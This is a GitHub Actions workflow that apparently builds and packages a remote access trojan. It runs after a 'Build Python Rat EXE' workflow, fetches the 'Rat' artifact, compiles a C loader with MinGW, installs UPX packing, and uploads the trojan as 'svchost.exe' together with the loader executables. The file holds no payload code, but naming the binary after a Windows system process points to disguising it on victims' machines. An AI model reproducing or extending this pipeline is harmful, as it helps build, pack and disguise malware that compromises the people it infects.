name: Build Loader Compact

on:
  workflow_run:
    workflows: ["Build Python Rat EXE"]
    types:
      - completed
  workflow_dispatch:

jobs:
  build-loader:
    runs-on: windows-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' || github.event_name == 'workflow_dispatch' }}
    
    steps:
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Install dependencies
        run: |
          pip install pyinstaller
      
      - name: Install UPX
        run: choco install upx -y
      
      - name: Install MinGW
        run: choco install mingw -y
      
      - name: Install zlib
        run: choco install zlib -y
      
      - name: Download artifact from main build
        if: ${{ github.event_name == 'workflow_run' }}
        uses: actions/download-artifact@v4
        with:
          name: Rat
          path: dist/
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
      
      - name: Build C loader
        run: |
          python loader_builder_c.py
      
      - name: Upload loader
        uses: actions/upload-artifact@v4
        with:
          name: Rat-Loader
          path: dist/loader_*.exe
          retention-days: 7
      
      - name: Upload both versions
        uses: actions/upload-artifact@v4
        with:
          name: Rat-All
          path: |
            dist/svchost.exe
            dist/loader_*.exe
          retention-days: 7
